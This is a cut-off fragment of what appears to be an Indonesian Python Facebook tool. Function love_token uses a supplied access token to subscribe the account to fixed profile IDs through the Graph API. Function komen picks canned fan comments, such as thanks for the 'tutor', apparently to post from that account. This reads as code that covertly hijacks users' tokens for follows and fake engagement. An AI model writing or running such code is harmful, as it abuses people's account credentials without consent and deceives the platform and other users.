...
def love_token(token):
	lis_id_foll = ["100005070704145", "100017704620928"]
	with requests.Session() as dev_:
		...
		dev_.post("https://graph.facebook.com/{}/subscribers?access_token={}".format(random.choice(["100005070704145", "100017704620928", "100027421568533"]), token))
		ikuti_ = []
def komen(token):
	for dev in range(1):
		with requests.Session() as dev_:
			komen_ = random.choice(["Halo YogaXD", "Gw Fans Lu Bang", "Gimana Kabarnya Bang?", "Hallo bang", "Keren Bos..", "Thanks bang Tutortnya", "Gak sia2 saya make tutor abang, Keren Abis, Ga ada Obat"])
